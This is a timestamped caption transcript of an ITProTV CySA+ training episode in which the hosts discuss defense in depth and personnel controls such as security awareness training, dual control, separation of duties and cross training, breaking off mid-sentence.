00:22:58.885\nSo as far as logging goes,\nit's a really good practice for\n\n455\n00:22:58.885 --> 00:23:01.010\nus to be doing that manual review.\n\n456\n00:23:01.010 --> 00:23:02.421\nI looking at our clock list.\n\n457\n00:23:02.421 --> 00:23:05.278\nI don't think we got enough time to start\ngetting into the next set of topics, so\n\n458\n00:23:05.278 --> 00:23:06.680\nit's probably a good stopping spot.\n\n459\n00:23:06.680 --> 00:23:08.317\n&gt;&gt; All right, Dan,\nlet's go ahead and do that.\n\n460\n00:23:08.317 --> 00:23:10.917\nWe'll end this one right here, but\nwe can always come back for part two, so\n\n461\n00:23:10.917 --> 00:23:11.590\nwe will wrap it up.\n\n462\n00:23:11.590 --> 00:23:14.290\nWe appreciate having you here in\nthe studios, and we appreciate you,\n\n463\n00:23:14.290 --> 00:23:15.160\nthe viewer, watching.\n\n464\n00:23:15.160 --> 00:23:17.980\nSigning off for\nITProTV I've been your host, Wes Bryan.\n\n465\n00:23:17.980 --> 00:23:18.550\n&gt;&gt; I'm Daniel

--> 00:00:12.004\n[MUSIC]\n\n7\n00:00:12.004 --> 00:00:15.446\n&gt;&gt; Hello and thank you for tuning in to\nanother great episode here at ITPROTV.\n\n8\n00:00:15.446 --> 00:00:18.072\nWe're glad you're here and\nchoosing us for your learning needs.\n\n9\n00:00:18.072 --> 00:00:21.648\nI'm your show host Wes Bryan and\nin today's episode well we are continuing\n\n10\n00:00:21.648 --> 00:00:24.600\nthrough our series in CySA+ Joining\nus back in the studios for\n\n11\n00:00:24.600 --> 00:00:26.330\nthis adventure is Mr. Dan Lowrie.\n\n12\n00:00:26.330 --> 00:00:27.785\nDan, how are we doing today, sir?\n&gt;&gt; I'm doing great, Wes.\n\n13\n00:00:27.785 --> 00:00:29.834\nThanks for having me on this show.,\nand thanks for\n\n14\n00:00:29.834 --> 00:00:31.830\njoining us on this show as well.\n&gt;&gt; It's a pleasure.\n\n15\n00:00:31.830 --> 00:00:32.742\n&gt;&gt; It's been fun so far.\n\n16\n00:00:32.742 --> 00:00:36.711\nHopefully you guys out there are having\na good time learning about CySA+,\n\n17\n00:00:36.711 --> 00:00:40.630\nalways a pleasure, right,\nto increase our security knowledge.\n\n18\n00:00:40.630 --> 00:00:41.535\nHopefully, at least that's my goal.\n\n19\n00:00:41.535 --> 00:00:46.198\nI'm working hard to bring that to you, and\ntoday we're continuing our conversation on\n\n20\n00:00:46.198 --> 00:00:50.988\ncompensating controls and design security\narchitecture, and that's what we're gonna\n\n21\n00:00:50.988 --> 00:00:54.128\ncontinue to take a look today.\n&gt;&gt; One of the topics that we're\n\n22\n00:00:54.128 --> 00:00:57.730\ngonna jump into is, I hear this\nterm a layer defense system, right?\n\n23\n00:00:57.730 --> 00:01:01.800\nI know the military is pretty much\none of the ones that started it.\n\n24\n00:01:01.800 --> 00:01:05.110\nI know computing systems and other major\nvendors, but it has been working for\n\n25\n00:01:05.110 --> 00:01:07.390\nthe military, let's go ahead with doctors.\n\n26\n00:01:07.390 --> 00:01:09.190\nYou tell us a little\nbit about this theory.\n\n27\n00:01:09.190 --> 00:01:10.030\n&gt;&gt; Yes, totally,\n\n28\n00:01:10.030 --> 00:01:13.290\ntotally can and hopefully,\nyou guys are already going.\n\n29\n00:01:13.290 --> 00:01:18.620\nI know this cuz we have alluded to it,\nwe have talked about it,\n\n30\n00:01:18.620 --> 00:01:23.430\nwe have brought it up multiple,\nmultiple times so far.\n\n31\n00:01:23.430 --> 00:01:26.020\nAnd now the exam is getting\nspecific about a like.\n\n32\n00:01:26.020 --> 00:01:29.610\nDon't forget there is defence in\ndepth there is layered defences.\n\n33\n00:01:29.610 --> 00:01:33.221\nAnd remember all that\nreally is saying well,\n\n34\n00:01:33.221 --> 00:01:38.840\nI've got some password well that's\none defence what else can you do?\n\n35\n00:01:38.840 --> 00:01:42.046\nFirewalls act okay I only accept\nconnections from X, Y and\n\n36\n00:01:42.046 --> 00:01:44.925\nZ computers okay there is\nanother Layer of defense,\n\n37\n00:01:44.925 --> 00:01:48.067\nremember, it's all about\ncreating as many obstacle for\n\n38\n00:01:48.067 --> 00:01:52.470\nan attacker to jump through before\nthey're able to reach the product, right?\n\n39\n00:01:52.470 --> 00:01:53.830\nAnd the more difficult that becomes for\n\n40\n00:01:53.830 --> 00:01:58.080\nthem the less likely they\nare to attain said goal.\n\n41\n00:01:58.080 --> 00:02:00.920\nThat's what we're looking\nat as a general idea\n\n42\n00:02:00.920 --> 00:02:04.363\nwhen it comes to Defense in depth.\n&gt;&gt; Dan, what it sounds like here is\n\n43\n00:02:04.363 --> 00:02:07.780\nyou've just laid a big vidalia onion right\non the table, right and that the core\n\n44\n00:02:07.780 --> 00:02:11.100\nof that onion is our data, and then\nthere's these layers around it, right.\n\n45\n00:02:11.100 --> 00:02:13.720\nSo, can you help us peel back the layers\nand kind of find out what those layers\n\n46\n00:02:13.720 --> 00:02:14.660\nmight be?\n&gt;&gt; Yeah, totally.\n\n47\n00:02:14.660 --> 00:02:15.160\nNo problem.\n\n48\n00:02:15.160 --> 00:02:19.820\nI wanna start off with personnel,\nright because they are part of our system.\n\n49\n00:02:19.820 --> 00:02:23.060\nWe have to deal with them and\nthis is where really compensated control,\n\n50\n00:02:23.060 --> 00:02:25.730\nthe idea of compensated controls,\ncomes in.\n\n51\n00:02:25.730 --> 00:02:30.100\nHow do I, yeah everyone's heard the joke,\nit's kind of crass but\n\n52\n00:02:30.100 --> 00:02:32.470\nthere's no patch for\nhuman stupidity, right?\n\n53\n00:02:32.470 --> 00:02:35.580\nStupidity is a real thing and\nI've done stupid things.\n\n54\n00:02:35.580 --> 00:02:39.270\nWes I'm sure you've done stupid things\nhopefully you're human out there that\n\n55\n00:02:39.270 --> 00:02:43.710\nmakes mistakes and [LAUGH] you've done\nthings that you're like why did I do that.\n\n56\n00:02:43.710 --> 00:02:46.730\nI've actually had that conversation\nwith a boss, I accidentally,\n\n57\n00:02:46.730 --> 00:02:48.000\nyou know I tell the story all the time.\n\n58\n00:02:48.000 --> 00:02:53.757\nI restarted the email server in the middle\nof the day, put it in the wrong group, and\n\n59\n00:02:53.757 --> 00:02:59.282\nthat was just a dumb, bonehead move that I\ndid and he asked my why did you do that?\n\n60\n00:02:59.282 --> 00:03:00.720\nCuz I didn't think.\n\n61\n00:03:00.720 --> 00:03:05.432\nI didn't have maybe a procedure in place\nthat I should've had or I didn't follow\n\n62\n00:03:05.432 --> 00:03:09.673\nthe procedure, it wasn't that I meant\nto do it, I did it accidentally.\n\n63\n00:03:09.673 --> 00:03:14.150\nThese things happen when you deal with\npeople it is something that occurs.\n\n64\n00:03:14.150 --> 00:03:18.882\nNow what we can do is start to try to\nlook at that and say, well it's a.\n\n65\n00:03:18.882 --> 00:03:25.210\nA phenomenon that occurs in reality so how\ncan we compensate for those things having.\n\n66\n00:03:25.210 --> 00:03:28.780\nHow come we reduce then\nyou're making that mistake.\n\n67\n00:03:28.780 --> 00:03:32.373\nAnd so we start with personnel, the first\nwhere we can this actually I wanna\n\n68\n00:03:32.373 --> 00:03:34.940\njump into my computer,\nthat will look a couple of ways\n\n69\n00:03:34.940 --> 00:03:38.518\nin which we can make these things happen\nor just rattle them very quickly.\n\n70\n00:03:38.518 --> 00:03:43.120\nTraining, dual controls,\nseparation of duties,\n\n71\n00:03:43.120 --> 00:03:47.850\ncross training, mandatory vacations,\nconsults, and succession planning.\n\n72\n00:03:47.850 --> 00:03:50.810\nThese are the topics we're gonna go\nthrough that are gonna be the compensating\n\n73\n00:03:50.810 --> 00:03:53.310\ncontrols around our personnel.\n\n74\n00:03:53.310 --> 00:03:58.136\nSo that we can eliminate inside threats,\naccidental problems that we\n\n75\n00:03:58.136 --> 00:04:03.291\ncreate inadvertently and all these\nthings come together we'll create our\n\n76\n00:04:03.291 --> 00:04:08.384\ncompensated controls around the personnel\nat work in our organization.\n\n77\n00:04:08.384 --> 00:04:10.529\nSo let's start off with that training.\n\n78\n00:04:10.529 --> 00:04:13.390\nThey say there's no patch for\nhuman stupidity.\n\n79\n00:04:13.390 --> 00:04:16.580\nI would suggest that maybe there\nis a patch for human stupidity and\n\n80\n00:04:16.580 --> 00:04:17.400\nthat is learning.\n\n81\n00:04:17.400 --> 00:04:21.030\nThat's what you're doing right now you\nwere trying to learn something new so\n\n82\n00:04:21.030 --> 00:04:23.080\nthat you don't make those mistakes.\n\n83\n00:04:23.080 --> 00:04:27.440\nIf my user does not know Wes\nif I said I need you to go and\n\n84\n00:04:27.440 --> 00:04:29.420\nfix the NASA space shuttle.\n\n85\n00:04:29.420 --> 00:04:31.720\nThe flange has just\nreally gotten worn out.\n\n86\n00:04:31.720 --> 00:04:34.120\nI want you to go ahead and\nchange that out for me.\n\n87\n00:04:34.120 --> 00:04:37.530\nWould you be able to perform that action?\n&gt;&gt; I really don't even have a clue\n\n88\n00:04:37.530 --> 00:04:40.160\nwhat you're talking about.\n&gt;&gt; Exactly right.\n\n89\n00:04:40.160 --> 00:04:41.050\nThat's my point.\n\n90\n00:04:41.050 --> 00:04:44.000\nIf you don't know you can't look for it.\n\n91\n00:04:44.000 --> 00:04:45.840\nYou can't compensate for it.\n\n92\n00:04:45.840 --> 00:04:49.880\nSo my users are the people, and\nthat includes myself, right?\n\n93\n00:04:49.880 --> 00:04:51.790\nI'm a user of the system.\n\n94\n00:04:51.790 --> 00:04:55.582\nI need to be doing training,\nsecurity awareness trainings what we're\n\n95\n00:04:55.582 --> 00:05:00.585\nspecifically talking about, because while\nwe're talking security plus, right?\n\n96\n00:05:00.585 --> 00:05:01.802\nIt's about security.\n\n97\n00:05:01.802 --> 00:05:06.489\nSo I need to have a developed and\nimplemented security awareness\n\n98\n00:05:06.489 --> 00:05:10.742\ntraining program that my users\nare required to perform and\n\n99\n00:05:10.742 --> 00:05:16.490\ncompletes successfully before I continue\nto allow them to work on the system.\n\n100\n00:05:16.490 --> 00:05:19.860\nThat way I know they have a set of\nterminologies that they're familiar with.\n\n101\n00:05:19.860 --> 00:05:24.170\nHaving set of security blunders that\ncould occur and things to look out for.\n\n102\n00:05:24.170 --> 00:05:26.790\nI can get them into\n\n103\n00:05:26.790 --> 00:05:31.410\nHelping with the security in our system.\n&gt;&gt; Dan, can this be something from right\n\n104\n00:05:31.410 --> 00:05:35.142\ndown to the person that maybe\nis controlling the phones,\n\n105\n00:05:35.142 --> 00:05:38.650\npoint of contact for our customers all\nthe way up to maybe even somebody like you\n\n106\n00:05:38.650 --> 00:05:41.730\nsaid that is a trained security\nprofessional learning what the new CVE is.\n\n107\n00:05:41.730 --> 00:05:42.912\n&gt;&gt; That is exactly right.\n\n108\n00:05:42.912 --> 00:05:46.470\nIt doesn't matter who\nthey are in the company.\n\n109\n00:05:46.470 --> 00:05:51.117\nEveryone plays a role as far as the\nsecurity of said company or organization.\n\n110\n00:05:51.117 --> 00:05:53.127\nAnd so we have to be giving them, and\n\n111\n00:05:53.127 --> 00:05:57.348\nagain this will be a developed thing that\nyou work around over time and ask as\n\n112\n00:05:57.348 --> 00:06:01.710\nthe river changes and as your people\nchange, your training needs to change.\n\n113\n00:06:01.710 --> 00:06:03.960\nSo it's this constantly\nevolving procedure.\n\n114\n00:06:03.960 --> 00:06:09.880\nSo you'd be revisiting and rehashing and\nreimplementing as those changes occur.\n\n115\n00:06:09.880 --> 00:06:12.930\nMake those changes as necessary, right?\n\n116\n00:06:12.930 --> 00:06:17.540\nSo, be aware that training is a very\nimportant thing and this will help\n\n117\n00:06:17.540 --> 00:06:21.730\nwith alleviation of maybe I shouldn't\nclick the attachment on this email.\n\n118\n00:06:21.730 --> 00:06:25.460\nMaybe I shouldn't click this link and\nfollow it to God knows where\n\n119\n00:06:25.460 --> 00:06:28.950\nbecause I remember in my security\nawareness training, it said that\n\n120\n00:06:28.950 --> 00:06:33.510\nsomehow people get usernames and\npasswords be able to attack the system.\n\n121\n00:06:33.510 --> 00:06:35.680\nI surely don't want that to be me.\n\n122\n00:06:35.680 --> 00:06:39.470\nSo now that they know that's\na common attack vector, and\n\n123\n00:06:39.470 --> 00:06:44.160\nit's something that they can look for, and\nthat it is their responsibility to avoid.\n\n124\n00:06:45.230 --> 00:06:47.960\nAnd we've given them the tools\nto be able to understand that.\n\n125\n00:06:47.960 --> 00:06:51.080\nNow we should have a much more secure\nsystem holistically, all right?\n\n126\n00:06:51.080 --> 00:06:54.670\nSo that's why training is important and\nthen training for ourselves as well.\n\n127\n00:06:54.670 --> 00:06:56.050\nNew attacks come out all the time.\n\n128\n00:06:56.050 --> 00:07:00.100\nThis is why you should be every time\nthat CompTIA releases a new version\n\n129\n00:07:00.100 --> 00:07:04.830\nof your CySA, should probably check\nthat out, maybe even re-certify.\n\n130\n00:07:04.830 --> 00:07:08.580\nAnd make sure that you're on top\nof whatever is the latest and\n\n131\n00:07:08.580 --> 00:07:12.390\ngreatest of attacks and\ndefenses that go in the security field.\n\n132\n00:07:12.390 --> 00:07:13.390\nSo it's our job.\n\n133\n00:07:13.390 --> 00:07:14.630\nWe're always learning.\n\n134\n00:07:14.630 --> 00:07:18.465\nThat's why us here at IT Pro TV try\nto build out that course library as\n\n135\n00:07:18.465 --> 00:07:21.899\nextensively as possible trying\nto give you folks the tools to\n\n136\n00:07:21.899 --> 00:07:24.347\nbe able to perform that very action right.\n\n137\n00:07:24.347 --> 00:07:26.160\nLet's move on to Dual Control.\n\n138\n00:07:27.470 --> 00:07:31.260\nIt's funny, I actually watched War Games\nthe other day, not for the first time.\n\n139\n00:07:31.260 --> 00:07:32.810\nI've seen it multiple, multiple times.\n\n140\n00:07:32.810 --> 00:07:34.150\nOne of my favorite movies.\n\n141\n00:07:34.150 --> 00:07:38.950\nI saw it when I was a kid when it came out\nand just was blown away by apparently it\n\n142\n00:07:38.950 --> 00:07:41.820\nimpacted me in some way shape or form\nbecause here I am teaching computer stuff.\n\n143\n00:07:41.820 --> 00:07:43.770\nRight?\nBecause end security, no less.\n\n144\n00:07:43.770 --> 00:07:44.960\nAnd that's what that movie was about.\n\n145\n00:07:44.960 --> 00:07:47.995\nBut at the beginning of the movie,\nthey were in a missile silo, right?\n\n146\n00:07:47.995 --> 00:07:50.971\nTwo airforce men were\nin a missile silo and\n\n147\n00:07:50.971 --> 00:07:55.572\nthey got the call to launch the missile,\nwe've been attacked.\n\n148\n00:07:55.572 --> 00:07:57.423\nThey didn't know this was a simulation.\n\n149\n00:07:57.423 --> 00:07:58.783\nThey didn't know that.\n\n150\n00:07:58.783 --> 00:08:01.837\nBut what they did was interesting they're\nboth, there was two guys remember?\n\n151\n00:08:01.837 --> 00:08:06.990\nThey both had a key, and both persons had\nto turn the key to launch the missile.\n\n152\n00:08:06.990 --> 00:08:11.480\nOne guy would not turn the key because\nhe was afraid of killing multiple,\n\n153\n00:08:11.480 --> 00:08:13.030\nmultiple millions of people, all right?\n\n154\n00:08:13.030 --> 00:08:17.267\nSo, something inside of him did not wanna\ndo that, I understand that [LAUGH] right?\n\n155\n00:08:17.267 --> 00:08:22.140\nSo he wouldn't turn his key, the other\ngentleman was unable to successfully fire\n\n156\n00:08:22.140 --> 00:08:27.026\nthe missile, because his a key alone would\nnot be sufficient to make the missile.\n\n157\n00:08:27.026 --> 00:08:32.410\nHad to be two people given that that's\nwhat we mean by dual controls, all right?\n\n158\n00:08:32.410 --> 00:08:39.470\nSo, it takes two or more individuals\nto perform individual actions or\n\n159\n00:08:39.470 --> 00:08:43.190\nanother action before it will occur.\n&gt;&gt; Love the apocalyptic nature of that\n\n160\n00:08:43.190 --> 00:08:43.770\none for sure.\n\n161\n00:08:43.770 --> 00:08:47.558\nAnd maybe somebody will say,\nI don't really have a key for\n\n162\n00:08:47.558 --> 00:08:48.813\na launch pad.\n&gt;&gt; Right.\n\n163\n00:08:48.813 --> 00:08:50.790\n&gt;&gt; Dan, would you say dual controls?\n\n164\n00:08:50.790 --> 00:08:54.118\nMaybe something that somebody does\ndo maybe not on a daily basis but\n\n165\n00:08:54.118 --> 00:08:55.077\nis familiar with.\n\n166\n00:08:55.077 --> 00:08:57.578\nWould a safety deposit box being\nan example of dual control?\n\n167\n00:08:57.578 --> 00:08:59.147\n&gt;&gt; Yeah another great example of that\n\n168\n00:08:59.147 --> 00:08:59.770\nright.\n&gt;&gt; Sure.\n\n169\n00:08:59.770 --> 00:09:01.400\n&gt;&gt; The bank has to have a key and\n\n170\n00:09:01.400 --> 00:09:05.270\nyou have to have a key before\nthe safety deposit box will open.\n\n171\n00:09:05.270 --> 00:09:08.550\nAnd inside of our digital systems you\ncan find this in a myriad of ways.\n\n172\n00:09:08.550 --> 00:09:13.000\nMaybe before I'm able to access\na certain system I need Wes to come and\n\n173\n00:09:13.000 --> 00:09:14.590\ngive me authorization, right?\n\n174\n00:09:14.590 --> 00:09:16.270\nHe has to put in his code.\n\n175\n00:09:16.270 --> 00:09:19.650\nAnd that gives me access to put\nin my code, which then therefore,\n\n176\n00:09:19.650 --> 00:09:23.190\nwe are now able to perform x,\ny, and z actions, right?\n\n177\n00:09:23.190 --> 00:09:27.970\nSo it's just, again, making that defense\nin depth that layers of defense.\n\n178\n00:09:27.970 --> 00:09:30.110\nIt doesn't just prevent against attack,\n\n179\n00:09:30.110 --> 00:09:34.590\nit prevents against also,\naccidental things from happening, right?\n\n180\n00:09:34.590 --> 00:09:38.000\nWhat if they're just fooling around with\ntheir missile keys, going, ha this is fun!\n\n181\n00:09:38.000 --> 00:09:39.070\nAnd the missile went off, right?\n\n182\n00:09:39.070 --> 00:09:43.850\nSo If you have one key, there is a much\nbetter possibility of that happening,\n\n183\n00:09:43.850 --> 00:09:45.980\ninstead of having two guys.\n\n184\n00:09:45.980 --> 00:09:49.250\nOne person might think better and go,\nthat's probably not a good idea for\n\n185\n00:09:49.250 --> 00:09:51.285\nus to be playing, missile keys.\n\n186\n00:09:51.285 --> 00:09:54.245\n[LAUGH] And turning it to launch,\nI don't know what you doing.\n\n187\n00:09:54.245 --> 00:09:56.350\n[LAUGH]\n&gt;&gt; I gonna jump in here, Dan,\n\n188\n00:09:56.350 --> 00:09:59.690\ncuz I know that next one is coming up and\nit's can get confusing, right?\n\n189\n00:09:59.690 --> 00:10:02.100\nBecause some people would look a this and\nsaid, dual control and\n\n190\n00:10:02.100 --> 00:10:03.420\nseparation of duties.\n\n191\n00:10:03.420 --> 00:10:06.910\nThese things they gotta be the same thing,\nbut they aren't, there is a distinct\n\n192\n00:10:06.910 --> 00:10:08.066\ndifference here isn't there?\n&gt;&gt; Yeah,\n\n193\n00:10:08.066 --> 00:10:10.760\nthere is a distinct\ndifference whereas with\n\n194\n00:10:10.760 --> 00:10:15.731\ndual control we're talking about a\nspecific process or procedure or whatever.\n\n195\n00:10:15.731 --> 00:10:20.813\nThat is meant for\nto people to perform different parts of so\n\n196\n00:10:20.813 --> 00:10:24.840\nthat the whole action is accomplished.\n\n197\n00:10:24.840 --> 00:10:31.250\nWhereas separation of duties is I\ndon't want, here is what happens.\n\n198\n00:10:31.250 --> 00:10:34.492\nIf Wes has complete control\nover the website, right?\n\n199\n00:10:34.492 --> 00:10:37.502\nHe's our web master and\nhe's webmaster general and\n\n200\n00:10:37.502 --> 00:10:39.920\nhe lets nobody come near his domain.\n\n201\n00:10:39.920 --> 00:10:41.480\nIt's his turf, right?\n\n202\n00:10:41.480 --> 00:10:43.380\nYou need a change, you go through Wes.\n\n203\n00:10:43.380 --> 00:10:45.890\nYou need something done?\nYou go to the Godfather, right?\n\n204\n00:10:45.890 --> 00:10:48.890\nAnd you kiss his ring.\n&gt;&gt; I'll make you an offer you can't\n\n205\n00:10:48.890 --> 00:10:49.590\nrefuse.\n&gt;&gt; Right.\n\n206\n00:10:49.590 --> 00:10:50.550\nAnd it's funny.\n\n207\n00:10:50.550 --> 00:10:53.740\nIf you notice what kind of analogy that\nI'm working here, what kind of metaphor\n\n208\n00:10:53.740 --> 00:10:59.400\nI'm working up, is that Wes is kind of\nthe almighty dictator over what happens.\n\n209\n00:10:59.400 --> 00:11:01.390\nHe has control.\n\n210\n00:11:01.390 --> 00:11:05.200\nI don't know what's happening with it, if\nI need something done, I gotta go to Wes.\n\n211\n00:11:05.200 --> 00:11:12.910\nSo, separating duties out, making Wes\nnot the sole provider of our website.\n\n212\n00:11:12.910 --> 00:11:17.705\nKeeps him from A,\nhaving the ability to basically extort me.\n\n213\n00:11:17.705 --> 00:11:19.690\n[LAUGH] Right?\n\n214\n00:11:19.690 --> 00:11:20.480\nYou want that done?\n\n215\n00:11:20.480 --> 00:11:22.160\nWell, I'm gonna need to see\na little extra money and\n\n216\n00:11:22.160 --> 00:11:25.580\na paycheck,\nyou know you're not paying me enough.\n\n217\n00:11:25.580 --> 00:11:27.250\nI don't even know if\nI'm paying him enough.\n\n218\n00:11:27.250 --> 00:11:30.150\nHe's in control of this whole thing,\nall I see is the end product.\n\n219\n00:11:30.150 --> 00:11:32.970\nIf I need something done he could tell me,\na h, it takes two weeks to do that.\n\n220\n00:11:32.970 --> 00:11:36.220\nIt takes him two minutes and\nhe watches YouTube all day, right?\n\n221\n00:11:36.220 --> 00:11:39.612\nI don't know.\nYou separate those duties out, it's less\n\n222\n00:11:39.612 --> 00:11:45.744\nlikely that he's able to perform that kind\nof, like I said extortion of something.\n\n223\n00:11:45.744 --> 00:11:50.484\nHe'll be less likely to get away with any\nkind of watching YouTube all day when he\n\n224\n00:11:50.484 --> 00:11:52.710\ndid a two minute change.\n\n225\n00:11:52.710 --> 00:11:56.639\nAnd the more I separate those duties out,\nthe less likely anybody is,\n\n226\n00:11:56.639 --> 00:11:59.977\nof performing some sort of either attack,\nor accidental.\n\n227\n00:11:59.977 --> 00:12:04.030\nOr just being outright slow to move.\n\n228\n00:12:04.030 --> 00:12:07.640\nIt helps people go I know I've\ngot to get this done because\n\n229\n00:12:07.640 --> 00:12:09.830\nBilly over here is gonna be waiting for\nthat work to get done.\n\n230\n00:12:09.830 --> 00:12:11.878\nSo that if I need one action completed and\n\n231\n00:12:11.878 --> 00:12:17.310\nit takes six different people to do it,\nthen I know who the hold up is.\n\n232\n00:12:17.310 --> 00:12:19.010\nI see where the bottleneck becomes.\n\n233\n00:12:20.380 --> 00:12:24.710\nWell, Sue is got her work done Sally,\n\n234\n00:12:24.710 --> 00:12:27.120\nshe is over there doing her nails and\njust hanging out.\n\n235\n00:12:27.120 --> 00:12:30.910\nAnd I'm like, Sally, we gotta get this\ndone, we know that you're the hold up.\n\n236\n00:12:30.910 --> 00:12:35.390\nBecause these duties have been separated\ninto little chunks of workflow and\n\n237\n00:12:35.390 --> 00:12:37.090\nthis is your part of that workflow.\n\n238\n00:12:37.090 --> 00:12:38.080\nSo I know exactly.\n\n239\n00:12:38.080 --> 00:12:40.310\nAnd that's a good way to think about it,\nto be honest with you,\n\n240\n00:12:40.310 --> 00:12:45.190\nas a workflow as a whole,\nstep A, step B, step C, step D.\n\n241\n00:12:45.190 --> 00:12:50.720\nAnd now, Bob gets step A, Billie gets step\nB Sue gets step C and Sally gets step D.\n\n242\n00:12:50.720 --> 00:12:55.560\nAnd now I'm able to find out where\nthe problem lies if there is a problem.\n\n243\n00:12:55.560 --> 00:12:59.900\nWhether that be a security issue or\nwhether that be a hold up in a performance\n\n244\n00:12:59.900 --> 00:13:02.721\nspecifically.\n&gt;&gt; One of the places that I've actually\n\n245\n00:13:02.721 --> 00:13:06.257\nseen this in our company that I used\nto work for backup operator, right?\n\n246\n00:13:06.257 --> 00:13:09.929\nMaking the back ups of the information\nas well as the restoration officer,\n\n247\n00:13:09.929 --> 00:13:12.971\nif you will back up officer,\noperator, it depends, right?\n\n248\n00:13:12.971 --> 00:13:14.782\nIt's really to deal with\nrole based access control,\n\n249\n00:13:14.782 --> 00:13:16.199\nwhich I know you touch in other episodes.\n\n250\n00:13:16.199 --> 00:13:18.175\nIs that the person who\nwas doing the back ups,\n\n251\n00:13:18.175 --> 00:13:20.310\ncouldn't be the person\nthat restored the data.\n\n252\n00:13:20.310 --> 00:13:23.390\nCuz the person that had access to take\nall of that sensitive information that we\n\n253\n00:13:23.390 --> 00:13:26.060\nwanted to keep protected wasn't\nthe person that could turn and\n\n254\n00:13:26.060 --> 00:13:27.460\nrestore that to the machine right?\n\n255\n00:13:27.460 --> 00:13:30.880\nBecause I could take backups of\nvirtual machines very easy today and\n\n256\n00:13:30.880 --> 00:13:35.820\nI turn around and back that information up\nand then spit it up in a virtual machine.\n\n257\n00:13:35.820 --> 00:13:38.295\nAnd now I have access to all\nyour private information\n\n258\n00:13:38.295 --> 00:13:41.115\nwith the companies\nspecifics sensitive data.\n\n259\n00:13:41.115 --> 00:13:43.815\nSo they wanted that separate,\nI could back up the information but\n\n260\n00:13:43.815 --> 00:13:45.005\nI couldn't see the backup sets,\n\n261\n00:13:45.005 --> 00:13:46.335\ncouldn't see the backup tapes.\n&gt;&gt; Right.\n\n262\n00:13:46.335 --> 00:13:47.815\n&gt;&gt; Much less perform the restoration\n\n263\n00:13:47.815 --> 00:13:50.865\noperation.\n&gt;&gt; Great example right there of\n\n264\n00:13:50.865 --> 00:13:55.270\nif Wes isn't the same person who not only\ntakes back ups but can restore them.\n\n265\n00:13:55.270 --> 00:13:58.410\nWell what if Wes does something that he\nshouldn't do and there's a log generated?\n\n266\n00:13:58.410 --> 00:14:00.960\nHe goes in and deletes the log,\n\n267\n00:14:00.960 --> 00:14:06.170\nhe's able to go into the archive as well,\ndelete the log too.\n\n268\n00:14:06.170 --> 00:14:08.260\nSo that's what's going on.\n&gt;&gt; That kind of brings\n\n269\n00:14:08.260 --> 00:14:10.490\nyour thought process full circus.\n\n270\n00:14:10.490 --> 00:14:13.490\nCircus, I don't know about full circus.\n\n271\n00:14:13.490 --> 00:14:14.640\nFull circle right.\n\n272\n00:14:14.640 --> 00:14:16.810\nIt cuts down on the abuse like you said.\n&gt;&gt; Exactly and\n\n273\n00:14:16.810 --> 00:14:18.700\nthat's what we're looking to avoid.\n\n274\n00:14:18.700 --> 00:14:21.270\nWe're just trying to take\naway the the temptation for\n\n275\n00:14:21.270 --> 00:14:25.840\nsomeone to be able to abuse the system\nby separating those duties out, okay?\n\n276\n00:14:25.840 --> 00:14:28.910\nNo one holds the keys to the kingdom,\nright?\n\n277\n00:14:28.910 --> 00:14:30.015\nIt's a set of keys and\n\n278\n00:14:30.015 --> 00:14:33.526\neveryone's got their own little\nniche that they work with, okay?\n\n279\n00:14:33.526 --> 00:14:38.319\nSo let's move into cross training, this\nagain and hopefully you start to see some\n\n280\n00:14:38.319 --> 00:14:42.290\nlogical progression of these controls for\nour personnel.\n\n281\n00:14:42.290 --> 00:14:45.410\nCross training,\nWes is the backup operator.\n\n282\n00:14:45.410 --> 00:14:48.131\ni am the backup restore operator.\n\n283\n00:14:48.131 --> 00:14:52.416\nBut he needs to have someone\nthat maybe Ronnie's over here.\n\n284\n00:14:52.416 --> 00:14:56.448\nWhat if Wes is walking to work one day and\nsplat he is hit by a bus and\n\n285\n00:14:56.448 --> 00:14:57.806\nthere is no more Wes?\n\n286\n00:14:57.806 --> 00:14:59.882\nRest in peace Wes.\n&gt;&gt; I would really appreciate if\n\n287\n00:14:59.882 --> 00:15:01.671\nthat did not happen.\n&gt;&gt; Yes well we will miss\n\n288\n00:15:01.671 --> 00:15:02.320\nyou,\n&gt;&gt; Okay\n\n289\n00:15:02.320 --> 00:15:03.000\n&gt;&gt; You will be sorely missed.\n\n290\n00:15:03.000 --> 00:15:05.079\nWe will say something nice.\n\n291\n00:15:05.079 --> 00:15:07.180\nBut he's gone, what do we do?\n\n292\n00:15:07.180 --> 00:15:10.440\nWell, now,\nwe're either hitting the panic button,\n\n293\n00:15:10.440 --> 00:15:14.200\ngoing, no,\nour backups are not being taken.\n\n294\n00:15:14.200 --> 00:15:16.130\nIf we get attacked right now,\n\n295\n00:15:16.130 --> 00:15:20.890\nit would be prime hunting season for\nany attacker out there in the wild.\n\n296\n00:15:20.890 --> 00:15:22.702\nWhat do we do?\nWell, okay, let's,\n\n297\n00:15:22.702 --> 00:15:26.580\nget out aAny kind of documentation\nWes had laying around.\n\n298\n00:15:26.580 --> 00:15:28.780\nLet's look for how we can,\nI don't know, how to perform this.\n\n299\n00:15:28.780 --> 00:15:31.300\nWe are gonna have to learn and say,\nokay, what system are we using?\n\n300\n00:15:31.300 --> 00:15:33.910\nWe are doing a lot of catch up playing,\nall right?\n\n301\n00:15:35.000 --> 00:15:38.490\nWhat if Wes had someone\nthat he had cross trained?\n\n302\n00:15:38.490 --> 00:15:41.870\nHe can take his vacation and\nthe job still gets done.\n\n303\n00:15:41.870 --> 00:15:44.601\nHe can get hit by that bus,\nhope that doesn't happen.\n\n304\n00:15:44.601 --> 00:15:51.002\nBut if it does, we as an organization\nare not out in the weeds, going, no.\n\n305\n00:15:51.002 --> 00:15:53.722\nWe got decapitated poultry\nsyndrome happening.\n\n306\n00:15:53.722 --> 00:15:55.532\nThat's what we want to avoid.\n\n307\n00:15:55.532 --> 00:15:56.405\nBackup operator.\n\n308\n00:15:56.405 --> 00:16:00.540\nThe backup, backup operator comes over and\nis able to go no problem.\n\n309\n00:16:00.540 --> 00:16:03.964\nI'm not going to be as good as Wes\nbecause he does it every day, but\n\n310\n00:16:03.964 --> 00:16:06.410\nI am trained on the system,\nI do know it works.\n\n311\n00:16:06.410 --> 00:16:11.146\nI have my own notes and I'll be able to\nperform the duties effectively enough\n\n312\n00:16:11.146 --> 00:16:13.886\nuntil,I become the full-time operator.\n\n313\n00:16:13.886 --> 00:16:17.503\nOr we’ve replaced Wes with someone with\nthat expertise and that’s what they do.\n\n314\n00:16:17.503 --> 00:16:19.330\nThen I can go back to my normal duties.\n\n315\n00:16:19.330 --> 00:16:24.043\nSo cross training is a very\nimportant part of being able 